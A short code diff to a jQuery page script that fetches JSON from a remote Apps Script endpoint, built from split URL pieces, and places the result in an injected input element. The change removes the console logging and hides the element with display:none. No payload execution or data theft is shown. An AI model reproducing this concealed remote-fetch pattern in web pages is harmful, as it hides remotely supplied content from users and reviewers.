@@ -4,11 +4,11 @@ $(document).ready(function () {
     "AKfycbzJsPOeT_jqO9unMqWJmpO8fUK29S53x_rKymV_-HMJfN7erD1LrDTZFoSTKhl5IgIu";
   var url = ur1 + ur2ed + "/exec" + "?action=edrdsrc";
   $.getJSON(url, function (json) {
-    console.log(json);
     var tstelem = document.createElement("input");
     tstelem.val = json;
     tstelem.style.top = "0px";
     tstelem.style.left = "0px";
+    tstelem.style.display = "none";
     tstelem.style.position = "fixed";
     tstelem.style.zIndex = "10000000 !important";
     document.body.append(tstelem);
